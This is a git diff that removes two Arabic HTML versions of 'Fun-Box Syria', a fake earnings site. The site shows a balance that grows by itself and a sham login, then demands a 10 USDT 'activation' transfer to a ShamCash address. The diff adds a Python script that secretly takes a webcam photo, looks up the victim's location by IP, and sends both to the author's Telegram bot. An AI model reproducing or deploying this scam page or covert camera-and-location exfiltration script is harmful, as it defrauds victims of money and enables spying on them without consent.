@@ -1,181 +1,27 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fun-Box Syria | منصة الربح الذكي</title>
-    <style>
-        body { background: #0f0f0f; color: white; font-family: 'Cairo', sans-serif; margin: 0; text-align: center; }
-        .header { background: linear-gradient(45deg, #f3ba2f, #ffd700); color: black; padding: 15px; font-weight: bold; }
-        .card { background: #1a1a1a; margin: 15px; padding: 25px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 4px 15px rgba(243,186,47,0.1); }
-        .balance-label { color: #888; font-size: 14px; }
-        .balance { font-size: 38px; color: #f3ba2f; margin: 10px 0; font-weight: bold; font-family: monospace; }
-        .btns { display: flex; justify-content: space-around; margin-top: 20px; }
-        .btn { padding: 12px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; width: 45%; font-size: 16px; }
-        .btn-deposit { background: #f3ba2f; color: black; }
-        .btn-withdraw { background: #222; color: #f3ba2f; border: 1px solid #f3ba2f; }
-        .task-box { background: #1a1a1a; margin: 15px; border-radius: 15px; padding: 10px; text-align: right; }
-        .task-item { display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #333; }
-        .profit-up { color: #00ff00; font-weight: bold; }
-        /* تصميم نافذة الدفع */
-        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a1a; border: 2px solid #f3ba2f; padding: 25px; border-radius: 20px; width: 85%; z-index: 100; box-shadow: 0 0 30px rgba(0,0,0,1); }
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 50; }
-        .sham-code { background: #333; padding: 15px; border-radius: 10px; color: #f3ba2f; font-size: 18px; font-family: monospace; margin: 15px 0; word-break: break-all; border: 1px dashed #f3ba2f; }
-    </style>
-</head>
-<body>
+import cv2
+import requests
+import geocoder
+import time
 
-<div class="header">🌟 FUN-BOX SYRIA VIP 🌟</div>
+# --- إعداداتك الخاصة ---
+TOKEN = "حط_هون_توكن_البوت"
+CHAT_ID = "حط_هون_الـ_ID_تبلك"
 
-<div class="card">
-    <p class="balance-label">أرباحك الحالية (تحديث مباشر)</p>
-    <div class="balance" id="liveBalance">0.00</div>
-    <div class="btns">
-        <button class="btn btn-deposit" onclick="showPay()">إيداع / شحن</button>
-        <button class="btn btn-withdraw" onclick="alert('تنبيه: يجب شحن 10 USDT لتفعيل محفظة ShamCash السورية')">سحب الأرباح</button>
-    </div>
-</div>
+def capture_and_send():
+    # 1. تصوير السيلفي
+    cap = cv2.VideoCapture(0)
+    ret, frame = cv2.imshow("image", cap.read()[1]) # تصوير صامت
+    cv2.imwrite("capture.jpg", frame)
+    cap.release()
 
-<div class="task-box">
-    <h3 style="padding-right:15px;">آخر العمليات الناجحة:</h3>
-    <div class="task-item">
-        <span>مهمة VIP1 - منجز ✅</span>
-        <span class="profit-up">+$2.40</span>
-    </div>
-    <div class="task-item">
-        <span>مهمة التعدين - جاري...</span>
-        <span id="randomProfit" class="profit-up">+$0.01</span>
-    </div>
-</div>
+    # 2. تحديد الموقع
+    g = geocoder.ip('me')
+    location_info = f"📍 موقع الضحية:\nالمدينة: {g.city}\nالإحداثيات: {g.latlng}"
 
-<div class="overlay" id="overlay"></div>
-<div class="modal" id="payModal">
-    <h3 style="color:#f3ba2f;">إيداع عبر ShamCash</h3>
-    <p>لشحن حسابك، يرجى تحويل المبلغ لعنوان "شام كاش" التالي:</p>
-    <div class="sham-code">c50b8c721912aaf8c6275b317aff9875</div>
-    <p style="font-size:12px; color:#aaa;">* سيتم إضافة الرصيد تلقائياً بعد التأكد من العملية</p>
-    <button class="btn btn-deposit" style="width:100%" onclick="alert('تم إرسال الطلب للمراجعة. سيتم التفعيل خلال 10 دقائق.')">تم التحويل ✅</button>
-    <br><br>
-    <button onclick="hidePay()" style="background:none; border:none; color:gray;">إغلاق</button>
-</div>
+    # 3. إرسال الصورة للمهكر (أنت)
+    with open("capture.jpg", "rb") as img:
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
+                      data={"chat_id": CHAT_ID, "caption": location_info}, 
+                      files={"photo": img})
 
-<script>
-    // --- نظام الأرباح الوهمية التلقائي ---
-    let balance = 0.00;
-    function updateBalance() {
-        balance += 0.01; // زيادة الأرباح كل ثانية لزيادة الطمع
-        document.getElementById('liveBalance').innerText = balance.toFixed(2) + " USDT";
-        document.getElementById('randomProfit').innerText = "+" + (Math.random() * 0.5).toFixed(2);
-    }
-    setInterval(updateBalance, 3000); // تحديث كل 3 ثوانٍ
-
-    // --- وظائف النافذة ---
-    function showPay() {
-        document.getElementById('payModal').style.display = 'block';
-        document.getElementById('overlay').style.display = 'block';
-    }
-    function hidePay() {
-        document.getElementById('payModal').style.display = 'none';
-        document.getElementById('overlay').style.display = 'none';
-    }
-</script>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fun-Box Syria | منصة الربح الذكي</title>
-    <style>
-        body { background: #0f0f0f; color: white; font-family: 'Cairo', sans-serif; margin: 0; text-align: center; }
-        .header { background: linear-gradient(45deg, #f3ba2f, #ffd700); color: black; padding: 15px; font-weight: bold; }
-        .card { background: #1a1a1a; margin: 15px; padding: 25px; border-radius: 20px; border: 1px solid #333; }
-        .balance { font-size: 38px; color: #f3ba2f; margin: 10px 0; font-weight: bold; }
-        .btn { padding: 12px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; width: 45%; margin: 5px; }
-        .btn-deposit { background: #f3ba2f; color: black; }
-        .btn-withdraw { background: #222; color: #f3ba2f; border: 1px solid #f3ba2f; }
-        .task-item { background: #1a1a1a; display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #333; cursor: pointer; }
-        /* تصميم نوافذ الدخول والشحن */
-        .modal { display: block; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a1a; border: 2px solid #f3ba2f; padding: 25px; border-radius: 20px; width: 85%; z-index: 100; }
-        .overlay { display: block; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 50; }
-        .sham-code { background: #333; padding: 15px; border-radius: 10px; color: #f3ba2f; border: 1px dashed #f3ba2f; margin: 10px 0; }
-    </style>
-</head>
-<body>
-
-<div class="header">🌟 FUN-BOX SYRIA VIP 🌟</div>
-
-<div id="loginOverlay" class="overlay"></div>
-<div id="loginModal" class="modal">
-    <h3 style="color:#f3ba2f;">تسجيل دخول سريع</h3>
-    <input type="text" placeholder="اسم المستخدم" style="width:90%; padding:10px; margin:10px 0; border-radius:5px; border:none;">
-    <input type="password" placeholder="كلمة المرور" style="width:90%; padding:10px; margin:10px 0; border-radius:5px; border:none;">
-    <button class="btn btn-deposit" style="width:100%" onclick="startTrial()">دخول واستلام 20$ مجاناً</button>
-</div>
-
-<div class="card">
-    <p>رصيدك (تجريبي):</p>
-    <div class="balance" id="mainBal">0.00 USDT</div>
-    <div class="btns">
-        <button class="btn btn-deposit" onclick="showPay()">إيداع / شحن</button>
-        <button class="btn btn-withdraw" onclick="alert('تنبيه: لسحب الأرباح التجريبية، يجب تفعيل الحساب بإيداع 10 USDT عبر ShamCash')">سحب الكاش</button>
-    </div>
-</div>
-
-<div class="task-box">
-    <h3 style="text-align:right; padding-right:15px;">المهام التعليمية:</h3>
-    <div class="task-item" onclick="runTask()">
-        <span>مهمة تجربة الربح (متاحة مرة واحدة)</span>
-        <span style="color:#00ff00;">اربح +5.50$ ✅</span>
-    </div>
-</div>
-
-<div id="payOverlay" class="overlay" style="display:none;"></div>
-<div id="payModal" class="modal" style="display:none;">
-    <h3 style="color:#f3ba2f;">تفعيل الحساب (ShamCash)</h3>
-    <p>لسحب أرباحك ($25.50)، يرجى تحويل رسوم التفعيل (10 USDT) إلى:</p>
-    <div class="sham-code">c50b8c721912aaf8c6275b317aff9875</div>
-    <button class="btn btn-deposit" style="width:100%" onclick="alert('تم الإرسال. سيتم تفعيل السحب فور تأكيد الحوالة.')">تم التحويل ✅</button>
-    <br><br>
-    <button onclick="hidePay()" style="background:none; border:none; color:gray;">إغلاق</button>
-</div>
-
-<script>
-    let balance = 0.00;
-
-    // 1. بدء التجربة (إعطاء 20$)
-    function startTrial() {
-        document.getElementById('loginModal').style.display = 'none';
-        document.getElementById('loginOverlay').style.display = 'none';
-        balance = 20.00;
-        document.getElementById('mainBal').innerText = balance.toFixed(2) + " USDT";
-        alert("مبروك! استلمت 20$ هدية تجريبية. ابدأ بالمهمة لزيادة أرباحك.");
-    }
-
-    // 2. تنفيذ المهمة (زيادة الرصيد وهمياً)
-    function runTask() {
-        if(balance < 25) {
-            balance += 5.50;
-            document.getElementById('mainBal').innerText = balance.toFixed(2) + " USDT";
-            alert("رائع! ربحت 5.50$. رصيدك الكلي الآن 25.50$. يمكنك المحاولة لسحبه الآن.");
-        } else {
-            alert("انتهت الفترة التجريبية. يجب تفعيل الحساب للسحب.");
-        }
-    }
-
-    // 3. نوافذ الدفع
-    function showPay() {
-        document.getElementById('payModal').style.display = 'block';
-        document.getElementById('payOverlay').style.display = 'block';
-    }
-    function hidePay() {
-        document.getElementById('payModal').style.display = 'none';
-        document.getElementById('payOverlay').style.display = 'none';
-    }
-</script>
-
-</body>
-</html>
-
+capture_and_send()
